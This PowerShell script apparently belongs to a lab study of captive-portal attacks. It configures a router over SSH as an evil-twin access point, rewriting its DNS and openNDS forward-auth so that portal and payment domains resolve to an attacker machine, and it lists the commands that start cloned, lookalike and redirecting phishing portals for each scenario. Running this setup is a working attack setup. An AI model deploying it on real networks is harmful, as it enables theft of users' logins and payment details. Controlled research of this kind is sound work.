<#
.SYNOPSIS
  Configures router B (and prints the laptop-side portal commands) for one
  experiment scenario from docs/experiments.md.

.DESCRIPTION
  Each scenario needs three things in place:
    1. Router B's DNS + openNDS FAS target (set here over SSH).
    2. The portal process(es) on the laptop (printed here; start them yourself
       so their logs stay in the foreground).
    3. Router A's portal role - genuine by default, or a genuine variant for
       the scenarios whose switch relies on the genuine flow (S3, S4a).

  Run .\reset.ps1 afterwards to return B to the plain evil-twin baseline.

.EXAMPLE
  .\scenario.ps1 S3
  .\reset.ps1
#>
[CmdletBinding()]
param(
  [Parameter(Mandatory)]
  [ValidateSet('S0','S1','S2','S3','S3m','S3h','S3j','S4a','S5a','S5b','S5c','S6','S7','N6')]
  [string]$Name,
  [string]$RouterB = 'mango-b',
  [string]$AttackerIP = '192.168.137.20'
)

$ErrorActionPreference = 'Stop'

function Invoke-B([string]$cmd) {
  Write-Host "B> $cmd" -ForegroundColor DarkGray
  ssh $RouterB $cmd
}

# Rewrites B's DNS address list to exactly $Hosts -> $AttackerIP, always
# keeping the status.client entry openNDS needs. $Hosts are the domains B
# should answer for itself (point at the attacker portal).
function Set-BDns([string[]]$Hosts) {
  $del = 'while uci -q delete dhcp.@dnsmasq[0].address; do :; done'
  $add = @("uci add_list dhcp.@dnsmasq[0].address='/status.client/192.168.247.1'")
  foreach ($h in $Hosts) { $add += "uci add_list dhcp.@dnsmasq[0].address='/$h/$AttackerIP'" }
  Invoke-B (($del, ($add -join '; '), 'uci commit dhcp', '/etc/init.d/dnsmasq restart') -join '; ')
}

# Points openNDS's forward-auth redirect at $Fqdn on the attacker portal.
function Set-BFas([string]$Fqdn) {
  Invoke-B (@(
    "uci set opennds.@opennds[0].fasremotefqdn='$Fqdn'",
    "uci set opennds.@opennds[0].fasremoteip='$AttackerIP'",
    'uci commit opennds', '/etc/init.d/opennds restart'
  ) -join '; ')
}

function Show-Laptop([string[]]$lines) {
  Write-Host "`nOn the laptop (in ...\GECKOWiFi\portal), run:" -ForegroundColor Cyan
  foreach ($l in $lines) { Write-Host "  $l" -ForegroundColor Cyan }
  Write-Host ''
}

$genuine  = '.\portal.exe serve -config .\config\genuine.json'
$bounce   = '.\portal.exe serve -config .\config\scenarios\genuine-bounce.json'
$payRedir = '.\portal.exe serve -config .\config\scenarios\genuine-pay-redirect.json'
function Atk([string]$f) { ".\portal.exe serve -config .\config\scenarios\$f" }

Write-Host "=== Scenario $Name ===" -ForegroundColor Green

switch ($Name) {
  'S0'  { Set-BDns @('portal.gecko-a.lab','pay.gecko-pay.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($genuine, (Atk 's0-relay.json')) }
  'S1'  { Set-BDns @('portal.gecko-a.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @((Atk 's1-clone.json')) }
  'S2'  { Set-BDns @('portal.gecko-a-login.lab'); Set-BFas 'portal.gecko-a-login.lab'
          Show-Laptop @((Atk 's2-lookalike.json')) }
  'S3'  { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @("$bounce   # A must emit the plain-HTTP /continue hop", (Atk 's3-redirect.json')) }
  'S3m' { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($bounce, (Atk 's3m-meta.json')) }
  'S3h' { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($bounce, (Atk 's3h-header.json')) }
  'S3j' { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($bounce, (Atk 's3j-js.json')) }
  'S4a' { Set-BDns @('portal.gecko-a.lab','pay.gecko-pay.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @("$payRedir   # A redirects the login page to the payment delegate", (Atk 's4a-payment.json')) }
  'S5a' { Set-BDns @('portal.gecko-a.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($genuine, (Atk 's5a-timer.json')) }
  'S5b' { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @($genuine, (Atk 's5b-ua.json')) }
  'S5c' { Set-BDns @('portal.gecko-a.lab','login.evil.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @((Atk 's5c-after-accept.json')) }
  'S6'  { Set-BDns @('portal.gecko-a.lab'); Set-BFas 'portal.gecko-a.lab'
          Show-Laptop @((Atk 's6-http-only.json')) }
  'S7'  { Set-BDns @('portal.gecko-a.lab'); Set-BFas 'portal.gecko-a.lab'
          Invoke-B (@(
            'uci set firewall.geckoblock=rule',
            "uci set firewall.geckoblock.name='GeckoBlockMap'",
            "uci set firewall.geckoblock.src='lan'",
            "uci set firewall.geckoblock.dest='wan'",
            "uci set firewall.geckoblock.dest_ip='192.168.137.1'",
            "uci set firewall.geckoblock.dest_port='1234'",
            "uci set firewall.geckoblock.proto='tcp'",
            "uci set firewall.geckoblock.target='REJECT'",
            'uci commit firewall', '/etc/init.d/firewall reload'
          ) -join '; ')
          Show-Laptop @((Atk 's1-clone.json'), '# map server stays up; B drops the client''s route to it') }
  'N6'  { Invoke-B "uci set wireless.wifi2g.ssid='GeckoOther'; uci commit wireless; wifi"
          Write-Host 'B now broadcasts an unregistered SSID (GeckoOther). Join that SSID to check #6.' -ForegroundColor Cyan }
}

Write-Host "Done. Deauth the client (ssh $RouterB `"ndsctl deauth <mac>`") before each run, then reset.ps1 when finished." -ForegroundColor Green
